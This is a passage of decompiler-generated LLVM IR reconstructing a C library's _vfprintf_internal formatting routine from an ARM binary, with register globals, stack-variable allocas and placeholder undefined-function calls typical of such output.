  uselistorder i32* %r5.global-to-local, { 0, 1, 4, 5, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 5, 4, 7, 6, 1, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_bafc, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %dec_label_pc_badc, { 1, 0 }
}

define i32 @_vfprintf_internal(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp98 = call i32 @__decompiler_undefined_function_0()
  %tmp99 = call i32 @__decompiler_undefined_function_0()
  %tmp102 = call i8 @__decompiler_undefined_function_3()
  %tmp103 = call i32 @__decompiler_undefined_function_0()
  %tmp104 = call i32 @__decompiler_undefined_function_0()
  %tmp105 = call i32 @__decompiler_undefined_function_0()
  %tmp106 = call i8 @__decompiler_undefined_function_3()
  %tmp107 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %stack_var_-73 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-352 = alloca i32, align 4
  %v6_bb08 = load i32, i32* @r5, align 4
  %v9_bb08 = load i32, i32* @r6, align 4
  %v12_bb08 = load i32, i32* @r7, align 4
  %v15_bb08 = load i32, i32* @r8, align 4
  %v18_bb08 = load i32, i32* @sb, align 4
  %v21_bb08 = load i32, i32* @sl, align 4
  %v24_bb08 = load i32, i32* @fp, align 4
  %v2_bb10 = ptrtoint i32* %stack_var_-352 to i32
  store i32 %v2_bb10, i32* @r6, align 4
  store i32 %arg1, i32* @fp, align 4
  store i32 %v2_bb10, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_bb20 = load i32, i32* @r2, align 4
  store i32 %v0_bb20, i32* @r5, align 4
  %v2_bb24 = call i32 @_ppfs_init(i32* nonnull %stack_var_-352)
  store i32 %v2_bb24, i32* %r0.global-to-local, align 4
  %v1_bb2c = icmp slt i32 %v2_bb24, 0
  br i1 %v1_bb2c, label %dec_label_pc_bb3c, label %dec_label_pc_bb70

dec_label_pc_bb3c:                                ; preds = %entry
  %v3_bb3c = load i32, i32* %stack_var_-352, align 4
  store i32 %v3_bb3c, i32* @r4, align 4
  %v1_bb40 = inttoptr i32 %v3_bb3c to i8*
  store i32 %v3_bb3c, i32* %r0.global-to-local, align 4
  %v3_bb44 = call i32 @strlen(i8* %v1_bb40)
  store i32 %v3_bb44, i32* %r0.global-to-local, align 4
  store i32 %v3_bb44, i32* @r1, align 4
  %v2_bb48 = icmp eq i32 %v3_bb44, 0
  br i1 %v2_bb48, label %bb, label %dec_label_pc_bb58

bb:                                               ; preds = %dec_label_pc_bb3c
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_c1c8

dec_label_pc_bb58:                                ; preds = %dec_label_pc_bb3c
  %v0_bb58 = load i32, i32* @r4, align 4
  store i32 %v0_bb58, i32* %r0.global-to-local, align 4
  %v0_bb5c = load i32, i32* @fp, align 4
  store i32 %v0_bb5c, i32* %r2.global-to-local, align 4
  %v3_bb60 = inttoptr i32 %v0_bb5c to i16*
  %v4_bb60 = call i32 @__stdio_fwrite(i32 %v0_bb58, i32 %v3_bb44, i16* %v3_bb60)
  store i32 %v4_bb60, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c1c8

dec_label_pc_bb70:                                ; preds = %entry
  %v0_bb70 = load i32, i32* @r5, align 4
  store i32 %v2_bb10, i32* %r0.global-to-local, align 4
  %v2_bb78 = call i32 @_ppfs_prepargs(i32 %v2_bb10, i32 %v0_bb70)
  store i32 %v2_bb78, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* @r1, align 4
  %v0_bbc0 = load i32, i32* @r4, align 4
  store i32 %v0_bbc0, i32* %r2.global-to-local, align 4
  %v1_bc44 = bitcast i32* %stack_var_-352 to i8*
  %v4_bc54 = zext i8 %tmp106 to i32
  %tmp137 = icmp slt i32 %tmp107, 1
  %v7_bc60 = ptrtoint i32* %stack_var_-272 to i32
  %v2_bc78 = ptrtoint i32* %stack_var_-40 to i32
  %v2_bc94 = icmp eq i32 %tmp104, 0
  %v2_bfd8 = ptrtoint i32* %stack_var_-200 to i32
  %v2_c018 = ptrtoint i32* %stack_var_-348 to i32
  %v2_c01c = ptrtoint i32* %stack_var_-72 to i32
  %v2_bec8 = ptrtoint i32* %stack_var_-44 to i32
  %v2_bed4 = ptrtoint i32* %stack_var_-52 to i32
  %v7_bd30 = zext i8 %tmp102 to i32
  %v2_bd68 = ptrtoint i32* %stack_var_-73 to i32
  %v1_bd70 = bitcast i32* %stack_var_-73 to i8*
  %v2_bd78 = icmp ugt i32 %tmp104, 4
  %v7_bd78 = icmp eq i32 %tmp104, 5
  %v7_bc5c = ptrtoint i32* %stack_var_-280 to i32
  %v5_bc8c195 = icmp sgt i32 %tmp105, 0
  %tmp207 = icmp ugt i32 %tmp104, 7
  %tmp208 = icmp ugt i32 %tmp104, 15
  %v2_be9c = icmp ugt i32 %tmp104, 16
  %v7_be9c = icmp eq i32 %tmp104, 17
  %v2_bea0 = xor i1 %v7_be9c, true
  %v3_bea0 = and i1 %v2_be9c, %v2_bea0
  %v2_bf24 = icmp ugt i32 %tmp104, 18
  %v7_bf24 = icmp eq i32 %tmp104, 19
  %v2_bf28 = xor i1 %v7_bf24, true
  %v3_bf28 = and i1 %v2_bf24, %v2_bf28
  %v7_bfc0 = icmp eq i32 %tmp104, 20
  %v1_bcd8 = add i32 %tmp104, add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 -38921)
  %v2_bcd8 = inttoptr i32 %v1_bcd8 to i8*
  %v2_bd04 = xor i1 %v7_bd78, true
  %v3_bd04 = and i1 %v2_bd78, %v2_bd04
  %v7_bd38 = icmp eq i32 %tmp104, 1
  %v2_bd80 = xor i1 %v2_bd78, true
  %v3_bd80 = or i1 %v7_bd78, %v2_bd80
  %tmp209 = icmp ult i32 %tmp104, 3
  %v7_bde8 = icmp eq i32 %tmp104, 3
  %v11_bdf4 = icmp eq i32 %tmp104, 4
  %v9_bc64 = mul nuw nsw i32 %v4_bc54, 8
  %v10_bc64 = add i32 %v7_bc5c, %v9_bc64
  br label %dec_label_pc_bbc4.outer

dec_label_pc_bbc4.outer:                          ; preds = %dec_label_pc_c1ac, %dec_label_pc_bb70
  %v0_bbc445 = phi i32 [ %v3_c1ac, %dec_label_pc_c1ac ], [ %v0_bbc0, %dec_label_pc_bb70 ]
  %v0_bcf8 = phi i32 [ %stack_var_-336.4, %dec_label_pc_c1ac ], [ %tmp103, %dec_label_pc_bb70 ]
  %stack_var_-356.1.ph = phi i32 [ %stack_var_-356.3, %dec_label_pc_c1ac ], [ 0, %dec_label_pc_bb70 ]
  br label %dec_label_pc_bbc4.outer36

dec_label_pc_bbc4.outer36:                        ; preds = %dec_label_pc_bbc4.outer, %dec_label_pc_c1b8
  %v0_bbc444 = phi i32 [ %v0_bbc445, %dec_label_pc_bbc4.outer ], [ %v1_c1b8, %dec_label_pc_c1b8 ]
  %v5_bbf0 = phi i32 [ %v0_bbc445, %dec_label_pc_bbc4.outer ], [ %v1_bc20, %dec_label_pc_c1b8 ]
  %stack_var_-356.1.ph37 = phi i32 [ %stack_var_-356.1.ph, %dec_label_pc_bbc4.outer ], [ %v1_c098, %dec_label_pc_c1b8 ]
  %v1_bbc4188 = inttoptr i32 %v0_bbc444 to i8*
  %v2_bbc4189 = load i8, i8* %v1_bbc4188, align 1
  %v2_bbc8191 = icmp eq i8 %v2_bbc4189, 0
  br i1 %v2_bbc8191, label %dec_label_pc_bbe0, label %bb138

bb138:                                            ; preds = %dec_label_pc_bbc4.outer36, %.thread6
  %v2_bbc4193 = phi i8 [ %v2_bbc4, %.thread6 ], [ %v2_bbc4189, %dec_label_pc_bbc4.outer36 ]
  %v1_bbd8192 = phi i32 [ %v2_bbd8, %.thread6 ], [ %v0_bbc444, %dec_label_pc_bbc4.outer36 ]
  %v8_bbcc = icmp eq i8 %v2_bbc4193, 37
  br i1 %v8_bbcc, label %dec_label_pc_bbe0, label %.thread6

.thread6:                                         ; preds = %bb138
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_bbd8 = add i32 %v1_bbd8192, 1
  store i32 %v2_bbd8, i32* @r4, align 4
  %v1_bbc4 = inttoptr i32 %v2_bbd8 to i8*
  %v2_bbc4 = load i8, i8* %v1_bbc4, align 1
  %v2_bbc8 = icmp eq i8 %v2_bbc4, 0
  br i1 %v2_bbc8, label %dec_label_pc_bbe0, label %bb138

dec_label_pc_bbe0:                                ; preds = %bb138, %.thread6, %dec_label_pc_bbc4.outer36
  %v1_bbd8.lcssa = phi i32 [ %v0_bbc444, %dec_label_pc_bbc4.outer36 ], [ %v2_bbd8, %.thread6 ], [ %v1_bbd8192, %bb138 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_bbe0 = sub i32 %v1_bbd8.lcssa, %v5_bbf0
  %v9_bbe0 = icmp eq i32 %v1_bbd8.lcssa, %v5_bbf0
  br i1 %v9_bbe0, label %dec_label_pc_bc14, label %dec_label_pc_bbe8

dec_label_pc_bbe8:                                ; preds = %dec_label_pc_bbe0
  store i32 %v2_bbe0, i32* @r5, align 4
  %tmp140 = icmp slt i32 %v2_bbe0, 1
  br i1 %tmp140, label %bb142, label %bb141

bb141:                                            ; preds = %dec_label_pc_bbe8
  store i32 %v5_bbf0, i32* %r0.global-to-local, align 4
  store i32 %v2_bbe0, i32* @r1, align 4
  %v5_bbf8 = load i32, i32* @fp, align 4
  store i32 %v5_bbf8, i32* %r2.global-to-local, align 4
  br label %bb142

bb142:                                            ; preds = %dec_label_pc_bbe8, %bb141
  %tmp143 = phi i1 [ true, %bb141 ], [ false, %dec_label_pc_bbe8 ]
  store i32 48128, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp143, i32 ptrtoint (i32* @global_var_12e10.456 to i32))
  %v0_bc00 = load i32, i32* %r0.global-to-local, align 4
  %v1_bc00 = load i32, i32* @r5, align 4
  %v9_bc00 = icmp eq i32 %v0_bc00, %v1_bc00
  br i1 %v9_bc00, label %dec_label_pc_bc08, label %dec_label_pc_c1c0

dec_label_pc_bc08:                                ; preds = %bb142
  %v2_bc0c = add i32 %v0_bc00, %stack_var_-356.1.ph37
  %v0_bc14.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_bc14

dec_label_pc_bc14:                                ; preds = %dec_label_pc_bbe0, %dec_label_pc_bc08
  %v0_bc28 = phi i32 [ %v5_bbf0, %dec_label_pc_bbe0 ], [ %v0_bc14.pre, %dec_label_pc_bc08 ]
  %v1_c098 = phi i32 [ %stack_var_-356.1.ph37, %dec_label_pc_bbe0 ], [ %v2_bc0c, %dec_label_pc_bc08 ]
  %v1_bc14 = inttoptr i32 %v0_bc28 to i8*
  %v2_bc14 = load i8, i8* %v1_bc14, align 1
  %v2_bc18 = icmp eq i8 %v2_bc14, 0
  br i1 %v2_bc18, label %dec_label_pc_c1c8, label %dec_label_pc_bc20

dec_label_pc_bc20:                                ; preds = %dec_label_pc_bc14
  %v1_bc20 = add i32 %v0_bc28, 1
  %v2_bc20 = inttoptr i32 %v1_bc20 to i8*
  %v3_bc20 = load i8, i8* %v2_bc20, align 1
  %v7_bc24 = icmp eq i8 %v3_bc20, 37
  store i32 %v1_bc20, i32* %r2.global-to-local, align 4
  br i1 %v7_bc24, label %dec_label_pc_c1b8, label %dec_label_pc_bc30

dec_label_pc_bc30:                                ; preds = %dec_label_pc_bc20
  store i32 %v2_bb10, i32* @r4, align 4
  store i32 %v2_bb10, i32* %r0.global-to-local, align 4
  store i32 %v1_bc20, i32* %stack_var_-352, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_bc44 = call i32 @_ppfs_parsespec(i8* %v1_bc44)
  store i32 %v2_bb10, i32* @r0, align 4
  %v0_bc4c = call i32 @_ppfs_setargs()
  store i32 %v0_bc4c, i32* %r0.global-to-local, align 4
  store i32 %v4_bc54, i32* @ip, align 4
  br i1 %tmp137, label %bb146, label %bb145

bb145:                                            ; preds = %dec_label_pc_bc30
  br label %bb146

bb146:                                            ; preds = %dec_label_pc_bc30, %bb145
  %storemerge = phi i32 [ %v10_bc64, %bb145 ], [ %v7_bc60, %dec_label_pc_bc30 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  br i1 %v5_bc8c195, label %dec_label_pc_bc70, label %dec_label_pc_bc90

dec_label_pc_bc70:                                ; preds = %bb146, %dec_label_pc_bc70
  %v5_bc7c197 = phi i32 [ %v5_bc7c, %dec_label_pc_bc70 ], [ %v2_bc78, %bb146 ]
  %v0_bc70196 = phi i32 [ %v1_bc74, %dec_label_pc_bc70 ], [ %storemerge, %bb146 ]
  %v2_bc70 = add i32 %v5_bc7c197, -32
  %v3_bc70 = inttoptr i32 %v2_bc70 to i32*
  store i32 %v0_bc70196, i32* %v3_bc70, align 4
  %v0_bc74 = load i32, i32* %r0.global-to-local, align 4
  %v1_bc74 = add i32 %v0_bc74, 8
  store i32 %v1_bc74, i32* %r0.global-to-local, align 4
  %v1_bc7c.pre = load i32, i32* %r2.global-to-local, align 4
  %v4_bc7c = mul i32 %v1_bc7c.pre, 4
  %v5_bc7c = add i32 %v4_bc7c, %v2_bc78
  %v1_bc88 = add i32 %v1_bc7c.pre, 1
  store i32 %v1_bc88, i32* %r2.global-to-local, align 4
  %v5_bc8c = icmp slt i32 %v1_bc7c.pre, %tmp105
  br i1 %v5_bc8c, label %dec_label_pc_bc70, label %dec_label_pc_bc90

dec_label_pc_bc90:                                ; preds = %dec_label_pc_bc70, %bb146
  store i32 %tmp104, i32* %r2.global-to-local, align 4
  br i1 %v2_bc94, label %dec_label_pc_bc9c, label %dec_label_pc_bcc0

dec_label_pc_bc9c:                                ; preds = %dec_label_pc_bc90
  %v3_bc9c = load i32, i32* %stack_var_-72, align 4
  %v1_bca8 = inttoptr i32 %v3_bc9c to i32*
  %v2_bca8 = load i32, i32* %v1_bca8, align 4
  store i32 %v2_bca8, i32* %r0.global-to-local, align 4
  %v1_bcac = and i32 %v0_bcf8, 3840
  store i32 %v1_c098, i32* %r2.global-to-local, align 4
  %v3_bcb4 = ashr i32 %v1_c098, 31
  %v4_bcb8 = inttoptr i32 %v2_bca8 to i16*
  %v5_bcb8 = call i32 @_store_inttype(i16* %v4_bcb8, i32 %v1_bcac, i32 %v1_c098, i32 %v3_bcb4)
  store i32 %v5_bcb8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c1ac

dec_label_pc_bcc0:                                ; preds = %dec_label_pc_bc90
  br i1 %tmp207, label %dec_label_pc_be5c, label %dec_label_pc_bcc8

dec_label_pc_bcc8:                                ; preds = %dec_label_pc_bcc0
  %v3_bcd8 = load i8, i8* %v2_bcd8, align 1
  %v4_bcd8 = zext i8 %v3_bcd8 to i32
  %v7_bcdc = icmp eq i8 %v3_bcd8, 10
  br i1 %v7_bcdc, label %dec_label_pc_bce8, label %bb147

bb147:                                            ; preds = %dec_label_pc_bcc8
  br label %bb151

dec_label_pc_bce8:                                ; preds = %dec_label_pc_bcc8
  %v1_bcf8 = and i32 %v0_bcf8, 64
  %v2_bcf8 = icmp eq i32 %v1_bcf8, 0
  br i1 %v2_bcf8, label %bb151, label %bb150

bb150:                                            ; preds = %dec_label_pc_bce8
  br label %bb151

bb151:                                            ; preds = %bb147, %dec_label_pc_bce8, %bb150
  br i1 %v3_bd04, label %.thread, label %dec_label_pc_bd0c

.thread:                                          ; preds = %bb151
  %v5_bd04 = sub nsw i32 0, %v4_bcd8
  br label %dec_label_pc_bd24

dec_label_pc_bd0c:                                ; preds = %bb151
  br i1 %v7_bde8, label %bb152, label %dec_label_pc_bd18

bb152:                                            ; preds = %dec_label_pc_bd0c
  br label %dec_label_pc_bd24

dec_label_pc_bd18:                                ; preds = %dec_label_pc_bd0c
  br i1 %v7_bd38, label %dec_label_pc_bd28, label %dec_label_pc_bd24

dec_label_pc_bd24:                                ; preds = %.thread, %bb152, %dec_label_pc_bd18
  %v0_bd5081 = phi i32 [ %v5_bd04, %.thread ], [ %v4_bcd8, %bb152 ], [ %v4_bcd8, %dec_label_pc_bd18 ]
  br label %dec_label_pc_bd28

dec_label_pc_bd28:                                ; preds = %dec_label_pc_bd18, %dec_label_pc_bd24
  %v0_bd5080 = phi i32 [ %v0_bd5081, %dec_label_pc_bd24 ], [ %v4_bcd8, %dec_label_pc_bd18 ]
  %storemerge91 = phi i32 [ 11, %dec_label_pc_bd24 ], [ 6, %dec_label_pc_bd18 ]
  store i32 %storemerge91, i32* @r6, align 4
  %v3_bd28 = load i32, i32* %stack_var_-348, align 4
  %v1_bd2c = icmp slt i32 %v3_bd28, 0
  %v7_bd30. = select i1 %v1_bd2c, i32 %v7_bd30, i32 32
  store i32 %v7_bd30., i32* @sb, align 4
  br i1 %v7_bd38, label %bb157, label %.thread15

.thread15:                                        ; preds = %dec_label_pc_bd28
  store i32 %v2_bc78, i32* %r2.global-to-local, align 4
  %v2_bd40 = load i32, i32* @ip, align 4
  %v5_bd40 = mul i32 %v2_bd40, 4
  %v6_bd40 = add i32 %v5_bd40, %v2_bc78
  %v2_bd44 = add i32 %v6_bd40, -276
  %v3_bd44 = inttoptr i32 %v2_bd44 to i32*
  %v4_bd44 = load i32, i32* %v3_bd44, align 4
  %v2_bd4c = and i32 %v4_bd44, 3840
  br label %bb157

bb157:                                            ; preds = %dec_label_pc_bd28, %.thread15
  %storemerge93 = phi i32 [ %v2_bd4c, %.thread15 ], [ 1024, %dec_label_pc_bd28 ]
  store i32 %storemerge93, i32* @r0, align 4
  store i32 %v0_bd5080, i32* @r2, align 4
  %v3_bd54 = load i32, i32* %stack_var_-72, align 4
  store i32 %v3_bd54, i32* @r1, align 4
  %v0_bd58 = call i32 @_load_inttype()
  store i32 %v0_bd58, i32* @r2, align 4
  %v0_bd64 = load i32, i32* @r1, align 4
  store i32 %v0_bd64, i32* @r3, align 4
  store i32 %v2_bd68, i32* %r0.global-to-local, align 4
  %v2_bd70 = call i32 @_uintmaxtostr(i8* %v1_bd70)
  store i32 %v2_bd70, i32* %r0.global-to-local, align 4
  store i32 %v2_bd70, i32* @r4, align 4
  br i1 %v3_bd80, label %bb160, label %dec_label_pc_bd84

dec_label_pc_bd84:                                ; preds = %bb157
  %v3_bd70 = inttoptr i32 %v2_bd70 to i8*
  %v3_bd84 = load i8, i8* %v3_bd70, align 1
  %v7_bd88 = icmp eq i8 %v3_bd84, 45
  %v2_bd90 = or i32 %v0_bcf8, 2
  %v2_bd90.stack_var_-336.0 = select i1 %v7_bd88, i32 %v2_bd90, i32 %v0_bcf8
  br i1 %v7_bd88, label %.thread17, label %dec_label_pc_bda4

.thread17:                                        ; preds = %dec_label_pc_bd84
  %v3_bd94 = add i32 %v2_bd70, 1
  store i32 %v3_bd94, i32* @r4, align 4
  store i32 2, i32* @r6, align 4
  br label %bb160

dec_label_pc_bda4:                                ; preds = %dec_label_pc_bd84
  %v1_bda4 = and i32 %v2_bd90.stack_var_-336.0, 2
  %v2_bda4 = icmp eq i32 %v1_bda4, 0
  br i1 %v2_bda4, label %dec_label_pc_bdb0, label %bb158

bb158:                                            ; preds = %dec_label_pc_bda4
  store i32 0, i32* @r6, align 4
  br label %bb160

dec_label_pc_bdb0:                                ; preds = %dec_label_pc_bda4
  %v1_bdb0 = urem i32 %v2_bd90.stack_var_-336.0, 2
  %v2_bdb0 = icmp eq i32 %v1_bdb0, 0
  br i1 %v2_bdb0, label %bb160, label %bb159

bb159:                                            ; preds = %dec_label_pc_bdb0
  store i32 4, i32* @r6, align 4
  br label %bb160

bb160:                                            ; preds = %.thread17, %bb158, %bb157, %dec_label_pc_bdb0, %bb159
  %v0_be0c = phi i32 [ %v2_bd70, %bb157 ], [ %v3_bd94, %.thread17 ], [ %v2_bd70, %dec_label_pc_bdb0 ], [ %v2_bd70, %bb159 ], [ %v2_bd70, %bb158 ]
  %v0_bdc8 = phi i32 [ %v0_bcf8, %bb157 ], [ %v2_bd90, %.thread17 ], [ %v0_bcf8, %dec_label_pc_bdb0 ], [ %v0_bcf8, %bb159 ], [ %v0_bcf8, %bb158 ]
  %v3_bdb8 = load i32, i32* %stack_var_-348, align 4
  %v1_bdc0 = icmp slt i32 %v3_bdb8, 0
  br i1 %v1_bdc0, label %bb161, label %bb162

bb161:                                            ; preds = %bb160
  br label %bb162

bb162:                                            ; preds = %bb160, %bb161
  %storemerge206 = phi i32 [ 1, %bb161 ], [ %v3_bdb8, %bb160 ]
  %v0_bdf0 = phi i32 [ 1, %bb161 ], [ %v3_bdb8, %bb160 ]
  store i32 %storemerge206, i32* %r2.global-to-local, align 4
  %v1_bdc8 = and i32 %v0_bdc8, 16
  %v2_bdc8 = icmp eq i32 %v1_bdc8, 0
  %v2_bdd4 = sub i32 %v2_bd68, %v0_be0c
  store i32 %v2_bdd4, i32* @r5, align 4
  br i1 %v2_bdc8, label %bb169, label %dec_label_pc_bddc

dec_label_pc_bddc:                                ; preds = %bb162
  br i1 %tmp209, label %bb163, label %bb164

bb163:                                            ; preds = %dec_label_pc_bddc
  store i32 6, i32* @r6, align 4
  br label %bb164

bb164:                                            ; preds = %dec_label_pc_bddc, %bb163
  br i1 %v7_bde8, label %bb165, label %bb166

bb165:                                            ; preds = %bb164
  store i32 9, i32* @r6, align 4
  br label %bb166

bb166:                                            ; preds = %bb164, %bb165
  %tmp210 = icmp ugt i32 %v0_bdf0, %v2_bdd4
  br i1 %tmp210, label %bb169, label %bb167

bb167:                                            ; preds = %bb166
  br i1 %v11_bdf4, label %dec_label_pc_bdfc, label %bb169

dec_label_pc_bdfc:                                ; preds = %bb167
  %v1_bdfc = inttoptr i32 %v0_be0c to i8*
  %v2_bdfc = load i8, i8* %v1_bdfc, align 1
  %v7_be00 = icmp eq i8 %v2_bdfc, 48
  br i1 %v7_be00, label %bb168, label %.thread24

bb168:                                            ; preds = %dec_label_pc_bdfc
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb169

.thread24:                                        ; preds = %dec_label_pc_bdfc
  %v2_be08 = add i32 %v2_bdd4, 1
  store i32 %v2_be08, i32* %r2.global-to-local, align 4
  br label %bb169

bb169:                                            ; preds = %bb166, %bb168, %bb167, %bb162, %.thread24
  %v5_be4c = phi i32 [ %v0_bdf0, %bb167 ], [ %v0_bdf0, %bb162 ], [ 1, %bb168 ], [ %v2_be08, %.thread24 ], [ %v0_bdf0, %bb166 ]
  %v1_be0c = inttoptr i32 %v0_be0c to i8*
  %v2_be0c = load i8, i8* %v1_be0c, align 1
  %v7_be10 = icmp eq i8 %v2_be0c, 48
  br i1 %v7_be10, label %dec_label_pc_be18, label %dec_label_pc_be48

dec_label_pc_be18:                                ; preds = %bb169
  %v0_be1c = load i32, i32* @r6, align 4
  %v7_be20 = icmp slt i32 %v0_be1c, 6
  br i1 %v7_be20, label %bb171, label %bb170

bb170:                                            ; preds = %dec_label_pc_be18
  store i32 11, i32* @r6, align 4
  br label %bb171

bb171:                                            ; preds = %dec_label_pc_be18, %bb170
  br i1 %v7_bd38, label %.thread27, label %dec_label_pc_be3c

.thread27:                                        ; preds = %bb171
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* @ip, align 4
  store i32 5, i32* @r5, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 -38948), i32* @r4, align 4
  br label %dec_label_pc_be54

dec_label_pc_be3c:                                ; preds = %bb171
  %v2_be3c = icmp eq i32 %v5_be4c, 0
  br i1 %v2_be3c, label %bb172, label %dec_label_pc_be48

bb172:                                            ; preds = %dec_label_pc_be3c
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_be54

dec_label_pc_be48:                                ; preds = %dec_label_pc_be3c, %bb169
  %v2_be48 = sub i32 %v5_be4c, %v2_bdd4
  %tmp211 = icmp ugt i32 %v5_be4c, %v2_bdd4
  br i1 %tmp211, label %.thread85, label %dec_label_pc_be54

.thread85:                                        ; preds = %dec_label_pc_be48
  store i32 %v2_be48, i32* @r8, align 4
  br label %dec_label_pc_c068thread-pre-split

dec_label_pc_be54:                                ; preds = %dec_label_pc_be48, %.thread27, %bb172
  %v1_c06c.pre205 = phi i32 [ %v2_bdd4, %dec_label_pc_be48 ], [ 5, %.thread27 ], [ 0, %bb172 ]
  store i32 0, i32* @r8, align 4
  br label %dec_label_pc_c068thread-pre-split

dec_label_pc_be5c:                                ; preds = %dec_label_pc_bcc0
  br i1 %tmp208, label %dec_label_pc_be9c, label %dec_label_pc_be64

dec_label_pc_be64:                                ; preds = %dec_label_pc_be5c
  %v3_be74 = load i32, i32* %stack_var_-72, align 4
  %v0_be78 = load i32, i32* @fp, align 4
  store i32 %v0_be78, i32* %r0.global-to-local, align 4
  %v1_be7c = inttoptr i32 %v3_be74 to i32*
  %v2_be7c = load i32, i32* %v1_be7c, align 4
  store i32 %v2_be7c, i32* %r2.global-to-local, align 4
  %v3_be7c = add i32 %v3_be74, 4
  %v4_be7c = inttoptr i32 %v3_be7c to i32*
  %v5_be7c = load i32, i32* %v4_be7c, align 4
  %v8_be80 = call i32 @_fpmaxtostr(i32 %v0_be78, double bitcast (i64 sext (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 -99724) to i64) to double), i32 %v2_be7c, i32 %v5_be7c, i32 %v2_c018, i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 -99724))
  store i32 %v8_be80, i32* %r0.global-to-local, align 4
  %v1_be84 = icmp slt i32 %v8_be80, 0
  br i1 %v1_be84, label %dec_label_pc_c1c0, label %dec_label_pc_be8c

dec_label_pc_be8c:                                ; preds = %dec_label_pc_be64
  %v2_be90 = add i32 %v8_be80, %v1_c098
  store i32 %v2_be90, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_c1ac

dec_label_pc_be9c:                                ; preds = %dec_label_pc_be5c
  br i1 %v3_bea0, label %dec_label_pc_bf24, label %dec_label_pc_bea4

dec_label_pc_bea4:                                ; preds = %dec_label_pc_be9c
  store i32 0, i32* @sl, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v3_beac = load i32, i32* %stack_var_-72, align 4
  store i32 %v3_beac, i32* %r0.global-to-local, align 4
  br i1 %v7_be9c, label %dec_label_pc_beb4, label %dec_label_pc_beec

dec_label_pc_beb4:                                ; preds = %dec_label_pc_bea4
  %v1_beb4 = inttoptr i32 %v3_beac to i32*
  %v2_beb4 = load i32, i32* %v1_beb4, align 4
  %v9_beb8 = icmp eq i32 %v2_beb4, 0
  store i32 %v2_beb4, i32* %stack_var_-44, align 4
  br i1 %v9_beb8, label %dec_label_pc_bf64, label %dec_label_pc_bec4

dec_label_pc_bec4:                                ; preds = %dec_label_pc_beb4
  %v3_bec4 = load i32, i32* %stack_var_-348, align 4
  store i32 %v2_bec8, i32* @r0, align 4
  %v4_becc = ashr i32 %v3_bec4, 31
  %v5_becc = or i32 %v4_becc, %v3_bec4
  store i32 %v5_becc, i32* %r2.global-to-local, align 4
  store i32 %v2_bec8, i32* @r1, align 4
  %v6_bed8 = call i32 @__GI_wcsrtombs(i32 %v2_bec8, i32 %v2_bec8, i32 %v5_becc, i32 %v2_bed4, i32 0, i32 %v2_beb4)
  store i32 %v6_bed8, i32* %r0.global-to-local, align 4
  %v3_bedc = icmp eq i32 %v6_bed8, -1
  store i32 %v6_bed8, i32* @r5, align 4
  br i1 %v3_bedc, label %dec_label_pc_c1c0, label %dec_label_pc_c058

dec_label_pc_beec:                                ; preds = %dec_label_pc_bea4
  store i32 %v2_bfd8, i32* %r7.global-to-local, align 4
  %v1_bef0 = inttoptr i32 %v3_beac to i32*
  %v2_bef0 = load i32, i32* %v1_bef0, align 4
  store i32 %v2_bed4, i32* %r2.global-to-local, align 4
  store i32 %v2_bfd8, i32* %r0.global-to-local, align 4
  %v5_befc = call i32 @__GI_wcrtomb(i32 %v2_bfd8, i32 %v2_bef0, i32 %v2_bed4, i32 %tmp105, i32 0)
  store i32 %v5_befc, i32* %r0.global-to-local, align 4
  %v7_bf00 = icmp eq i32 %v5_befc, -1
  store i32 %v5_befc, i32* @r5, align 4
  br i1 %v7_bf00, label %dec_label_pc_c1c0, label %dec_label_pc_bf0c

dec_label_pc_bf0c:                                ; preds = %dec_label_pc_beec
  %v0_bf0c = load i32, i32* @sl, align 4
  store i32 %v0_bf0c, i32* @r8, align 4
  store i32 %v2_bfd8, i32* @r4, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  %v1_bf1c = trunc i32 %v0_bf0c to i8
  %v2_bf1c = load i32, i32* %r7.global-to-local, align 4
  %v4_bf1c = add i32 %v2_bf1c, %v5_befc
  %v5_bf1c = inttoptr i32 %v4_bf1c to i8*
  store i8 %v1_bf1c, i8* %v5_bf1c, align 1
  %v0_c06c.pre.pre = load i32, i32* @r8, align 4
  %v1_c06c.pre.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_c068thread-pre-split

dec_label_pc_bf24:                                ; preds = %dec_label_pc_be9c
  br i1 %v3_bf28, label %dec_label_pc_bfc0, label %dec_label_pc_bf2c

dec_label_pc_bf2c:                                ; preds = %dec_label_pc_bf24
